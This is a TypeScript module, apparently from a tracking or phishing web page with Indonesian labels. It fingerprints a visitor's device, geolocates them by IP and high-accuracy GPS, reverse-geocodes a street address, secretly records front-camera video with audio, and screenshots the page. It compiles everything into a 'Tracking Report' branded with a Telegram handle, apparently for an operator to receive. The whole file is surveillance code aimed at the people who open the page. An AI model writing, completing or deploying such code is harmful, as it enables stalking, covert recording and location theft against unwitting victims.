import type { LocationDetails } from '../types';

interface VideoCaptureResult {
    blob: Blob;
    filename: string;
}

const getLocationDetails = async (lat: number, lon: number): Promise<LocationDetails> => {
    try {
        const response = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1`);
        const data = await response.json();
        if (data.address) {
            return {
                county: data.address.county || data.address.city || data.address.state || "Tidak diketahui",
                suburb: data.address.suburb || data.address.village || data.address.town || "Tidak diketahui",
                fullAddress: data.display_name || "Alamat tidak tersedia"
            };
        }
    } catch (e) {
        console.error("Failed to get location details:", e);
    }
    return {
        county: "Tidak diketahui",
        suburb: "Tidak diketahui",
        fullAddress: "Alamat tidak tersedia"
    };
};

export const getDeviceInformation = async (): Promise<string> => {
    let report = '<b>╭───── Tracking Report ───── ⦿</b>\n\n';
    report += '⚙️ <b>DEVICE INFORMATION</b> | BUKAN GPS TRACKING\n';
    report += `<code>🖥️ Device: ${navigator.userAgent}</code>\n`;
    report += `<code>💻 Platform: ${navigator.platform}</code>\n`;
    report += `<code>🌐 Bahasa: ${navigator.language}</code>\n`;
    report += `<code>📶 Online: ${navigator.onLine ? 'Online' : 'Offline'}</code>\n`;
    report += `<code>📺 Screen: ${window.screen.width}x${window.screen.height}</code>\n`;
    report += `<code>🪟 Window: ${window.innerWidth}x${window.innerHeight}</code>\n`;
    report += `<code>💾 RAM: ${(navigator as any).deviceMemory || 'Unknown'} GB</code>\n`;
    report += `<code>🧠 CPU Cores: ${navigator.hardwareConcurrency}</code>\n`;

    if ((navigator as any).getBattery) {
        try {
            const battery = await (navigator as any).getBattery();
            report += `<code>🔋 Battery: ${Math.floor(battery.level * 100)}%</code>\n`;
            report += `<code>🔌 Charging: ${battery.charging ? '✅ YA' : '❌ TIDAK'}</code>\n`;
        } catch (e) {
            report += '<code>🔋 Battery: ❌ Tidak tersedia</code>\n';
        }
    }

    report += `<code>⏰ Waktu: ${new Date().toString()}</code>\n`;
    report += `<code>📜 History: ${window.history.length}</code>\n`;
    report += `<code>✋ Touch: ${'ontouchstart' in window ? '✅ YA' : '❌ TIDAK'}</code>\n`;
    report += `<code>🔗 Referrer: ${document.referrer || 'None'}</code>\n`;
    report += `<code>🌍 URL: ${window.location.href}</code>\n\n`;

    try {
        const ipResponse = await fetch('https://ipapi.co/json/');
        const ipData = await ipResponse.json();
        report += '📍 <b>LOCATION INFORMATION (BASED ON IP)</b>\n';
        report += `<code>📡 IP: ${ipData.ip}</code>\n`;
        report += `<code>🏙️ Kota: ${ipData.city}</code>\n`;
        report += `<code>🗺️ Wilayah: ${ipData.region}</code>\n`;
        report += `<code>🌎 Negara: ${ipData.country_name}</code>\n`;
        report += `<code>🏷️ Kode Pos: ${ipData.postal}</code>\n`;
        if (ipData.latitude && ipData.longitude) {
            report += `<code>📌 Coords: ${ipData.latitude}, ${ipData.longitude}</code>\n`;
            const details = await getLocationDetails(ipData.latitude, ipData.longitude);
            report += `<code>🏠 Alamat: ${details.fullAddress}</code>\n`;
        }
    } catch (e) {
        report += '❌ Gagal mendapatkan informasi lokasi berbasis IP\n';
    }
    report += '\n<b>╰───── Telegram @ryzzreal ───── ⦿</b>';
    return report;
};

export const getGpsLocation = (): Promise<string> => {
    return new Promise((resolve, reject) => {
        if (!navigator.geolocation) {
            return reject(new Error("Geolocation tidak didukung oleh browser ini."));
        }

        navigator.geolocation.getCurrentPosition(
            async (position) => {
                const { latitude, longitude, accuracy } = position.coords;
                const details = await getLocationDetails(latitude, longitude);
                let report = '📍 <b>GPS TRACKING (HIGH ACCURACY)</b>\n';
                report += `<code>📌 Lat: ${latitude}</code>\n`;
                report += `<code>📍 Lng: ${longitude}</code>\n`;
                report += `<code>🎯 Akurasi: ${accuracy}m</code>\n`;
                report += `<code>🗺️ Google Maps: https://www.google.com/maps/search/?api=1&query=${latitude},${longitude}</code>\n`;
                report += `<code>🏙️ Kabupaten: ${details.county}</code>\n`;
                report += `<code>🏙️ Kecamatan: ${details.suburb}</code>\n`;
                report += `<code>🏠 Alamat: ${details.fullAddress}</code>\n`;
                resolve(report);
            },
            (error) => {
                reject(new Error(`GPS Error: ${error.message}`));
            },
            { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
        );
    });
};

export const recordVideo = (durationMs: number): Promise<VideoCaptureResult> => {
    return new Promise(async (resolve, reject) => {
        if (!window.MediaRecorder) {
            return reject(new Error('MediaRecorder API not supported in this browser.'));
        }

        let stream: MediaStream | null = null;
        const cleanup = () => {
            stream?.getTracks().forEach(track => track.stop());
            clearTimeout(timeoutId);
        };
        const timeoutId = setTimeout(() => {
            cleanup();
            reject(new Error('Video recording timed out.'));
        }, durationMs + 5000); // Timeout is duration + 5s buffer

        try {
            // Attempt 1: Front camera with audio
            try {
                stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: 'user' },
                    audio: true,
                });
            } catch (e1) {
                console.warn("Front camera with audio failed, falling back to video-only.", e1);
                // Attempt 2: Front camera, no audio
                try {
                    stream = await navigator.mediaDevices.getUserMedia({
                        video: { facingMode: 'user' },
                        audio: false,
                    });
                } catch (e2) {
                    console.warn("Front camera video-only failed, falling back to any video.", e2);
                    // Attempt 3: Any camera, no audio (most compatible)
                    stream = await navigator.mediaDevices.getUserMedia({
                        video: true,
                        audio: false,
                    });
                }
            }
           
            const supportedMimeTypes = [
                'video/webm;codecs=vp9',
                'video/webm;codecs=vp8',
                'video/webm',
                'video/mp4',
            ];
            const supportedType = supportedMimeTypes.find(type => MediaRecorder.isTypeSupported(type));

            if (!supportedType) {
                cleanup();
                return reject(new Error('No supported video mimeType found for MediaRecorder.'));
            }
            
            const options = { mimeType: supportedType };
            const mediaRecorder = new MediaRecorder(stream, options);
            const chunks: Blob[] = [];

            mediaRecorder.ondataavailable = (event) => {
                if (event.data.size > 0) {
                   chunks.push(event.data);
                }
            };

            mediaRecorder.onstop = () => {
                cleanup();
                const videoBlob = new Blob(chunks, { type: options.mimeType });
                const extension = options.mimeType.includes('mp4') ? 'mp4' : 'webm';
                const filename = `video_capture.${extension}`;
                
                if (videoBlob.size === 0) {
                     reject(new Error('Video recording resulted in an empty file.'));
                } else {
                     resolve({ blob: videoBlob, filename });
                }
            };
            
            mediaRecorder.onerror = (event) => {
                 cleanup();
                 reject((event as ErrorEvent).error || new Error('MediaRecorder encountered an unknown error.'));
            };

            mediaRecorder.start();

            setTimeout(() => {
                if (mediaRecorder.state === 'recording') {
                    mediaRecorder.stop();
                }
            }, durationMs);

        } catch (error) {
            cleanup();
            reject(new Error(`Could not get any camera stream for recording: ${(error as Error).message}`));
        }
    });
};

export const takeScreenshot = (): Promise<Blob | null> => {
    return new Promise(async (resolve, reject) => {
        try {
            // eslint-disable-next-line @typescript-eslint/no-explicit-any
            const canvas = await (window as any).html2canvas(document.body);
            canvas.toBlob((blob: Blob | null) => {
                if (blob) {
                    resolve(blob);
                } else {
                    reject(new Error("Screenshot blob creation failed."));
                }
            }, 'image/jpeg');
        } catch (error) {
            reject(error);
        }
    });
};